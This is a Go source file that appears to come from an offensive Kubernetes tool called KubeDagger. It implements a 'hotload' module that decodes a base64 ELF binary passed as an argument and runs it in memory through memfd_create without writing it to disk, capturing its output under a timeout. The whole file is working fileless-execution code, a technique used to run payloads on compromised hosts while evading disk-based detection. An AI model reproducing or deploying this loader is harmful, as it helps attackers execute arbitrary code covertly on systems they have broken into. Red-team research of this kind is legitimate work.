/*
Copyright © 2023 MOHAMMED YASIN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package modules

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/yasindce1998/KubeDagger/pkg/memexec"
)

const hotloadMaxOutput = 64 << 10 // 64KB

// hotloadMu serializes in-memory executions: the child process inherits
// os.Stdout/os.Stderr at fork time, so the global fd swap in run() must not
// overlap with another hotload execution.
var hotloadMu sync.Mutex

// Hotload executes a base64-encoded ELF payload entirely in memory via
// memfd_create, never touching the disk.
type Hotload struct{}

func (m *Hotload) Name() string       { return "hotload" }
func (m *Hotload) Platform() []string { return []string{"linux"} }

func (m *Hotload) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	encoded := args["exec_b64"]
	if encoded == "" {
		return nil, fmt.Errorf("hotload requires exec_b64 argument (base64-encoded ELF binary)")
	}

	payload := make([]byte, base64.StdEncoding.DecodedLen(len(encoded)))
	n, err := base64.StdEncoding.Decode(payload, []byte(encoded))
	if err != nil {
		return nil, fmt.Errorf("invalid base64 in exec_b64: %w", err)
	}
	payload = payload[:n]
	if len(payload) == 0 {
		return nil, fmt.Errorf("exec_b64 decoded to empty payload")
	}

	var argv []string
	if argsStr := args["args_str"]; argsStr != "" {
		// memexec expects the full argv vector: argv[0] is the program name
		// the child sees, followed by its arguments.
		argv = append([]string{"hotload"}, strings.Fields(argsStr)...)
	}

	timeout := 60 * time.Second
	if t := args["timeout"]; t != "" {
		d, err := time.ParseDuration(t)
		if err != nil {
			return nil, fmt.Errorf("invalid timeout %q: %w", t, err)
		}
		if d <= 0 {
			return nil, fmt.Errorf("timeout must be positive, got %s", d)
		}
		timeout = d
	}

	if runtime.GOOS != "linux" {
		// The executor's platform check normally blocks this, but handle a
		// direct invocation gracefully.
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("hotload only supports linux (current: %s)", runtime.GOOS),
		}, nil
	}

	output, exitCode, err := runMemfdPayload(payload, argv, timeout)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("hotload exec failed: %v", err),
		}, nil
	}

	var sb strings.Builder
	fmt.Fprintf(&sb, "hotload: executed %d byte payload via memfd (exit code %d)\n", len(payload), exitCode)
	if len(output) > 0 {
		sb.WriteString("--- output ---\n")
		sb.WriteString(output)
		if !strings.HasSuffix(output, "\n") {
			sb.WriteString("\n")
		}
	}

	return &Result{
		Success: exitCode == 0,
		Output:  sb.String(),
	}, nil
}

// runMemfdPayload executes the payload through the memfd injector and
// captures the child's combined output. memexec attaches the child to
// os.Stdout/os.Stderr at fork time, so those globals are briefly swapped to
// a pipe (under hotloadMu) and restored immediately after the fork.
func runMemfdPayload(payload []byte, argv []string, timeout time.Duration) (string, int, error) {
	hotloadMu.Lock()
	defer hotloadMu.Unlock()

	readEnd, writeEnd, err := os.Pipe()
	if err != nil {
		return "", -1, fmt.Errorf("create output pipe: %w", err)
	}

	oldStdout, oldStderr := os.Stdout, os.Stderr
	os.Stdout, os.Stderr = writeEnd, writeEnd

	injector := memexec.NewInjector(memexec.MethodMemFD)
	pid, execErr := injector.ExecuteMemfd(payload, argv)

	// Restore the process streams as soon as the child has been forked so
	// the swap window is minimal.
	os.Stdout, os.Stderr = oldStdout, oldStderr
	writeEnd.Close()

	if execErr != nil {
		readEnd.Close()
		return "", -1, execErr
	}

	proc, err := os.FindProcess(pid)
	if err != nil {
		readEnd.Close()
		return "", -1, fmt.Errorf("find pid %d: %w", pid, err)
	}

	waitCh := make(chan int, 1)
	go func() {
		state, waitErr := proc.Wait()
		if waitErr != nil || state == nil {
			waitCh <- -1
			return
		}
		waitCh <- state.ExitCode()
	}()

	var exitCode int
	timer := time.NewTimer(timeout)
	defer timer.Stop()

	select {
	case exitCode = <-waitCh:
	case <-timer.C:
		// Timed out: kill the child and reap it.
		if killErr := proc.Kill(); killErr != nil {
			_ = killErr // best effort; Wait below will still return
		}
		exitCode = <-waitCh
		readEnd.Close()
		return "", exitCode, fmt.Errorf("execution timed out after %s", timeout)
	}

	// Give late writers a short grace period to flush before draining the
	// pipe; a deadline also protects against grandchildren holding it open.
	_ = readEnd.SetReadDeadline(time.Now().Add(2 * time.Second))
	data, _ := io.ReadAll(io.LimitReader(readEnd, hotloadMaxOutput))
	readEnd.Close()

	return string(data), exitCode, nil
}
